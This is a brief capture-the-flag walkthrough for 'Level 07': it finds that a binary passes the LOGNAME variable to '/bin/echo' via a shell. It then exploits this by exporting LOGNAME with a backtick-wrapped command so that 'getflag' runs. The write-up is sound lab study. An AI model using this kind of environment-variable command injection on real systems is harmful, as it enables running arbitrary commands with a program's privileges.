# Level 07

With a string or nm, we get `/bin/echo %s` and `getenv` use.

We deduce it echo the LOGNAME var: export `LOGNAME=getflag`. This only prints get flag.

We just need to escape it with:

```bash
export LOGNAME=\`getflag\`
```